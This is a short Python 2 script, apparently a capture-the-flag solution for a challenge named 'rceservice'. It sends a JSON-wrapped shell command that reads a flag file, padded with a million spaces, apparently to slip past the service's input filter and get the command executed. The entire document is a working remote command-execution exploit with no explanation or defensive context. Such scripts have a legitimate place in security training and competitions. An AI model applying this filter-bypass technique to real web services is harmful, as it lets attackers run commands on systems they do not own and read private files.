#!/usr/bin/env python2

import requests

URL = 'http://localhost:80'

padding = ' ' * 1000000
r = requests.post(URL, data={'cmd': '{"cmd": "/bin/cat /home/rceservice/flag"}' + padding})
print r.content
